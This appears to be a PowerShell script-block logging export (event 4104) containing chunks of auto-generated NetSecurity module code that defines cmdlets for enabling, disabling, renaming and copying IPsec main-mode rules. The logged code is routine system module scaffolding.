    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecMainModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecMainModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }
    if ($PSBoundParameters.ContainsKey('TracePolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecMainModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('TracePolicyStore', ${TracePolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecMainModeCryptoSet', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Enable', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecMainModeRule.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Enable-NetIPsecMainModeRule' -Alias '*'
        

function Disable-NetIPsecMainModeRule
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetMainModeRule')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Description},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled[]]
    ${Enabled},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${MainModeCryptoSet},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Phase1AuthSet},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PrimaryStatus[]]
    ${PrimaryStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Status},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyStoreSource},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(

ScriptBlock ID: 4cfc0bc4-892a-446d-8c97-3f4fcceb24f0
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (7 of 9):
rSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Description') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Description})
        $__cmdletization_queryBuilder.FilterByProperty('Description', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Enabled') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Enabled})
        $__cmdletization_queryBuilder.FilterByProperty('Enabled', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('MainModeCryptoSet') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${MainModeCryptoSet})
        $__cmdletization_queryBuilder.FilterByProperty('MainModeCryptoSet', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Phase1AuthSet') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Phase1AuthSet})
        $__cmdletization_queryBuilder.FilterByProperty('Phase1AuthSet', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PrimaryStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PrimaryStatus})
        $__cmdletization_queryBuilder.FilterByProperty('PrimaryStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Status') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Status})
        $__cmdletization_queryBuilder.FilterByProperty('Status', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSource') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSource})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSource', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallAddressFilter') -and (@('ByAssociatedNetFirewallAddressFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallAddressFilter}, 'MSFT_NetMainModeRuleFilterByAddress', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallProfile') -and (@('ByAssociatedNetFirewallProfile') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallProfile}, 'MSFT_NetMainModeRuleInProfile', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecPhase1AuthSet') -and (@('ByAssociatedNetIPsecPhase1AuthSet') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecPhase1AuthSet}, 'MSFT_NetMainModeRuleMMAuthSet', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecMainModeCryptoSet') -and (@('ByAssociatedNetIPsecMainModeCryptoSet') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecMainModeCryptoSet}, 'MSFT_NetMainModeRuleMMCryptoSet', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecMainModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecMainModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }
    if ($PSBoundParameters.ContainsKey('TracePolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecMainModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('TracePolicyStore', ${TracePolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecMainModeCryptoSet', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('NewPolicyStore')) {
            [object]$__cmdletization_value = ${NewPolicyStore}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewPolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewPolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('NewGPOSession')) {
            [object]$__cmdletization_value = ${NewGPOSession}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewGPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewGPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('NewName')) {
            [object]$__cmdletization_value = ${NewName}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('CloneObject', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecMainModeRule.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Copy-NetIPsecMainModeRule' -Alias '*'
        

function Enable-NetIPsecMainModeRule
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetMainModeRule')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Description},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled[]]
    ${Enabled},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${MainModeCryptoSet},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Phase1AuthSet},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PrimaryStatus[]]
    ${PrimaryStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Status},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyStoreSource},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetAddressFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallAddressFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallProfile')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallProfile},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEP1AuthSet')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecPhase1AuthSet},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEMMCryptoSet')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecMainModeCryptoSet},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

 

ScriptBlock ID: 4cfc0bc4-892a-446d-8c97-3f4fcceb24f0
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (6 of 9):
perty('Phase1AuthSet', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PrimaryStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PrimaryStatus})
        $__cmdletization_queryBuilder.FilterByProperty('PrimaryStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Status') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Status})
        $__cmdletization_queryBuilder.FilterByProperty('Status', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSource') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSource})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSource', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallAddressFilter') -and (@('ByAssociatedNetFirewallAddressFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallAddressFilter}, 'MSFT_NetMainModeRuleFilterByAddress', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallProfile') -and (@('ByAssociatedNetFirewallProfile') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallProfile}, 'MSFT_NetMainModeRuleInProfile', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecPhase1AuthSet') -and (@('ByAssociatedNetIPsecPhase1AuthSet') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecPhase1AuthSet}, 'MSFT_NetMainModeRuleMMAuthSet', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecMainModeCryptoSet') -and (@('ByAssociatedNetIPsecMainModeCryptoSet') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecMainModeCryptoSet}, 'MSFT_NetMainModeRuleMMCryptoSet', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecMainModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecMainModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }
    if ($PSBoundParameters.ContainsKey('TracePolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecMainModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('TracePolicyStore', ${TracePolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecMainModeCryptoSet', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('NewName')) {
            [object]$__cmdletization_value = ${NewName}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Rename', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecMainModeRule.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Rename-NetIPsecMainModeRule' -Alias '*'
        

function Copy-NetIPsecMainModeRule
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetMainModeRule')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Description},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled[]]
    ${Enabled},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${MainModeCryptoSet},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Phase1AuthSet},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PrimaryStatus[]]
    ${PrimaryStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Status},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyStoreSource},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetAddressFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallAddressFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallProfile')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallProfile},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet', Mandatory=$true, ValueFromPipeline=$true)]
